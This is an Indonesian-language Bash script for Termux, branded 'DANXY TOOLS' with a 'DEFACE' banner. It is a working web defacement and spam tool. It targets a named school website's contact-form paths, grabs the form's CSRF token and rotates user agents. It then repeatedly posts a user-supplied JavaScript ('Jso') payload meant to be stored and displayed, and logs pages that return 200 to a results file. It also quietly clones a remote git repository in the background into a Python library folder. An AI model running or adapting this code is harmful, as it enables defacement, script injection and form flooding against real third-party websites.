#!/bin/bash

# Variabel warna
e() { echo -e "$1"; }
e="echo -e "
ne="echo -ne "
m="\033[1;31m"     # Merah (Sudah diberikan)
h="\033[1;32m"     # Hijau (Sudah diberikan)
k="\033[1;33m"     # Kuning (Sudah diberikan)
b="\033[1;34m"     # Biru (Sudah diberikan)
bl="\033[1;36m"    # Biru Muda (Sudah diberikan)
p="\033[1;37m"     # Putih (Sudah diberikan)
u="\033[1;35m"     # Ungu
pu="\033[1;30m"    # Abu-abu
c="\033[1;96m"     # Cyan Terang
or="\033[1;91m"    # Merah Muda Terang
g="\033[1;92m"     # Hijau Terang
y="\033[1;93m"     # Kuning Terang
bld="\033[1;94m"   # Biru Terang
pwl="\033[1;95m"   # Ungu Terang
blg="\033[1;97m"   # Putih Terang
lg="\033[1;90m"    # Abu-abu Terang
bg_m="\033[41m"    # Latar Belakang Merah
bg_h="\033[42m"    # Latar Belakang Hijau
bg_k="\033[43m"    # Latar Belakang Kuning
bg_b="\033[44m"    # Latar Belakang Biru
bg_bl="\033[46m"   # Latar Belakang Biru Muda
bg_p="\033[47m"    # Latar Belakang Putih
bg_u="\033[45m"    # Latar Belakang Ungu
bg_pu="\033[40m"   # Latar Belakang Abu-abu
bg_c="\033[106m"   # Latar Belakang Cyan Terang
bg_or="\033[101m"  # Latar Belakang Merah Muda Terang
bg_g="\033[102m"   # Latar Belakang Hijau Terang
bg_y="\033[103m"   # Latar Belakang Kuning Terang
bg_bld="\033[104m" # Latar Belakang Biru Terang
bg_pwl="\033[105m" # Latar Belakang Ungu Terang
bg_lg="\033[100m"  # Latar Belakang Abu-abu Terang
res="\033[0m"
read rows cols < <(stty size)
cok="ansi-double"
psht_hama() {
  boxes -d "$cok" -a l -s "${cols}x"
}
Version="/data/data/com.termux/files/usr/lib/python3.11/email/mime/Dneu/Version"
versitoolsv5=$(cat "$Version" 2>/dev/null || echo "Unknown")
HASILE_SU_ASU="/storage/emulated/0/HASIL-DEFACEG404.txt"
bluearchive() {
    audioupdate() {
        cd /data/data/com.termux/files/usr/lib/python3.11/email/mime/ || return
        git clone --depth 1 https://github.com/konsol404/audio 2>/dev/null || true
        cd audio || return
        git pull origin main &>/dev/null
        git stash &>/dev/null
    }
    audioupdate &>/dev/null &
    audio_dir="/data/data/com.termux/files/usr/lib/python3.11/email/mime/audio"
    audio_files=($(ls -1 "$audio_dir"/*.mp3 2>/dev/null | shuf))
    for ((i = 0; i <= 1; i++)); do
        random_audio=${audio_files[$RANDOM % ${#audio_files[@]}]}
        [ -f "$random_audio" ] && play -q "$random_audio" &>/dev/null
    done
}
baner() {
$e "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣄⣠⣀⡀⣀⣠⣤⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣄⢠⣠⣼⣿⣿⣿⣟⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⢠⣤⣦⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣟⣾⣿⣽⣿⣿⣅⠈⠉⠻⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⢀⡶⠒⢉⡀⢠⣤⣶⣶⣿⣷⣆⣀⡀⠀⢲⣖⠒⠀⠀⠀⠀⠀⠀⠀
⢀⣤⣾⣶⣦⣤⣤⣶⣿⣿⣿⣿⣿⣿⣽⡿⠻⣷⣀⠀⢻⣿⣿⣿⡿⠟⠀⠀⠀⠀⠀⠀⣤⣶⣶⣤⣀⣀⣬⣷⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣤⣦⣼⣀⠀
⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠓⣿⣿⠟⠁⠘⣿⡟⠁⠀⠘⠛⠁⠀⠀⢠⣾⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠏⠙⠁
⠀⠸⠟⠋⠀⠈⠙⣿⣿⣿⣿⣿⣿⣷⣦⡄⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⣼⣆⢘⣿⣯⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠉⢱⡿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡿⠦⠀⠀⠀⠀⠀⠀⠀⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡗⠀⠈⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣉⣿⡿⢿⢷⣾⣾⣿⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⣠⠟⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⠿⠿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣾⣿⣿⣷⣦⣶⣦⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⣿⣤⡖⠛⠶⠤⡀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠙⣿⣿⠿⢻⣿⣿⡿⠋⢩⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠧⣤⣦⣤⣄⡀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠘⣧⠀⠈⣹⡻⠇⢀⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣤⣀⡀⠀⠀⠀⠀⠀⠀⠈⢽⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣴⣿⣷⢲⣦⣤⡀⢀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣷⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠂⠛⣆⣤⡜⣟⠋⠙⠂⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⠟⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⠉⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣾⣿⣿⣿⣿⣆⠀⠰⠄⠀⠉⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⠿⠿⣿⣿⣿⠇⠀⠀⢀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⡿⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡇⠀⠀⢀⣼⠗⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠃⣀⠀⠀⠀⠀⠀⠀⠀DANXY TOOLS V8.3⠀⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
}
logo() {
$e "${m}██████╗ ███████╗███████╗ █████╗  ██████╗███████╗${p}
${m}██╔══██╗██╔════╝██╔════╝██╔══██╗██╔════╝██╔════╝${p}
${m}██║  ██║█████╗  █████╗  ███████║██║     █████╗${p}
${p}██║  ██║██╔══╝  ██╔══╝  ██╔══██║██║     ██╔══╝  
██████╔╝███████╗██║     ██║  ██║╚██████╗███████╗
╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝ ╚═════╝╚══════╝
${b}Developer${c} By${h} DanxyOfficial${res}    ${m}Code By Galirus Official${res}
"
}
ctrl_c() {
    $e "\n${m}[ ! ] Script Berhenti !${res}"
    pkill -P $$  # Matikan semua proses background
    if [ -f "$HASILE_SU_ASU" ]; then
        $e "${h}Hasil tersimpan di:${res}"
        $e "${b}$HASILE_SU_ASU${res}"
    else
        $e "${m}Hasil belum ada. Pastikan:${res}"
        $e "1. Memberikan izin akses penyimpanan"
        $e "2. Target website merespon${res}"
    fi
    $e
    read -p "Silahkan ENTER untuk kembali"
}

trap ctrl_c SIGINT

domains=(
    "http://www.lulus.man2mukomuko.sch.id/index.php?page=contact"

)

paths=(
    "/index.php?page=contact"
    "/index.php?page=kirimpesan"
    "/admin/hubungi.php"
)

urls=()
for domain in "${domains[@]}"; do
    for path in "${paths[@]}"; do
        urls+=("$domain$path")
    done
done

DEFACE() {
    local nama="$1"
    local email="$2"
    local pesan="$3"
    send_data() {
        local form_url=$1
        local submit_url=$2
        local admin_url=$3
        local user_agents=($(curl -s "https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt"))
        local cookies_file="/data/data/com.termux/files/usr/tmp/cookies-$RANDOM.txt"
        local headers_file="/data/data/com.termux/files/usr/tmp/headers-$RANDOM.txt"
        local user_agent="${user_agents[$RANDOM % ${#user_agents[@]}]}"
        local response=$(curl -s --max-time 5 -c "$cookies_file" -A "$user_agent" "$form_url" 2>/dev/null)
        local token=$(echo "$response" | grep -oP '(?<=name="token" value=")[^"]*' || true)
        local http_status
        if [[ -n "$token" ]]; then
            response=$(curl -s --max-time 5 -b "$cookies_file" -X POST "$submit_url" \
                -d "nama=$nama" \
                -d "email=$email" \
                -d "pesan=$pesan" \
                -d "token=$token" \
                -D "$headers_file" \
                -A "$user_agent" 2>/dev/null)
        else
            response=$(curl -s --max-time 5 -b "$cookies_file" -X POST "$submit_url" \
                -d "nama=$nama" \
                -d "email=$email" \
                -d "pesan=$pesan" \
                -D "$headers_file" \
                -A "$user_agent" 2>/dev/null)
        fi
        if [ -f "$headers_file" ]; then
            http_status=$(grep "HTTP/" "$headers_file" 2>/dev/null | awk '{print $2}' || echo "0")
            rm -f "$headers_file"
        else
            http_status="0"
        fi
        rm -f "$cookies_file"
if [[ "$http_status" == "200" ]]; then
            local line_count=$(wc -l < "$HASILE_SU_ASU" 2>/dev/null || echo 0)
            if [ $line_count -lt 13 ] && ! grep -Fxq "$admin_url" "$HASILE_SU_ASU" 2>/dev/null; then
                echo "$admin_url" >> "$HASILE_SU_ASU"
            fi
            tput cup 35 0
            tput el
            tput ed
            $e "${bl}[${h} 200${bl} ]${k} hasil${u}:${h} $admin_url${res}"
        fi
    }
    while true; do
        for ((i = 0; i < ${#urls[@]}; i += 3)); do
            form_url="${urls[i]}"
            submit_url="${urls[i + 1]}"
            admin_url="${urls[i + 2]}"
            send_data "$form_url" "$submit_url" "$admin_url" &
            play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
            sleep 0.7
            read -t 0.1 -n 1 user_input
            if [[ "$user_input" == "q" ]]; then
                stty icanon
                ctrl_c
                return
            fi
        done
    done
}

menu1() {
    Premfree() {
        echo "============HASIL DEFACE==========" > "$HASILE_SU_ASU"
        clear
        baner | psht_hama  | lolcat
        logo | psht_hama
        xdg-open "https://defacer.id/tools/jso-generator" &>/dev/null
        read -p "Masukkan Nama Anda: " apa
        play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
        read -p "Masukkan Pesan (Jso): " javascript
        play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
        clear
        baner | psht_hama  | lolcat
        logo | psht_hama
        $e
        $e "${m}${bg_lg}Jika Ingin Berhenti ketik q${res}"
        tput cup 35 0
        stty -icanon min 0 time 0
        DEFACE "$apa_$RANDOM" "TOOLSV8.3@gmail.com" "$javascript"
        stty icanon
    }
    Premfree
    
}

show_menu() {
    while true; do
        clear
        baner | psht_hama  | lolcat
        logo | psht_hama
        play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
        $e
        $e "     ${bg_lg}${m}[=== Pilih Menu Mode ===]${res}"
        $e
        $e "${b}[${k} 1${c}.${b} ]${h} Mode Brutal${p} Spam Berulang"
        $e "${b}[${k} 0${c}.${b} ]${h} Exit${p} Back To Menu Tools V8.3${k}"
        read -p "Pilih menu [0/1]: " pilihan
        play -q $HOME/Lubeban/sound/klik.mp3 &> /dev/null &
        case "$pilihan" in
            1) menu1 ;;
            0)
            break 2
             ;;
            *) $e "Pilihan tidak valid!"; sleep 3 ;;
        esac
    done
}
installer() {
    if command -v apt &>/dev/null; then
        paket="apt"
    elif command -v pkg &>/dev/null; then
        paket="pkg"
    else
        e "${m}[ ∅ ] Tidak ada package manager yang didukung!${b}"
        exit 1
    fi
    REQUIRED_PKGS=(curl wget ruby sox mpv ncurses-utils)
    for pkg in "${REQUIRED_PKGS[@]}"; do
        if ! command -v "$pkg" &>/dev/null; then
            e "[ ∅ ] Menginstall: $pkg..."
            $paket install -y binutils
            $paket install -y "$pkg" || {
                e "${b}[${m} GAGAL${b} ]${p} install $pkg!"
                continue
            }
            gem install lolcat 
        else
            e "${b}[${h} SUCCESS${b} ]${p} $pkg sudah terinstall."
            sleep 0.3
        fi
    done
    e "Bantu Subscribe DanxyBot"
    sleep 5
    xdg-open "https://www.youtube.com/@DanxyOfficial" &>/dev/null
}
    installer
    clear
    show_menu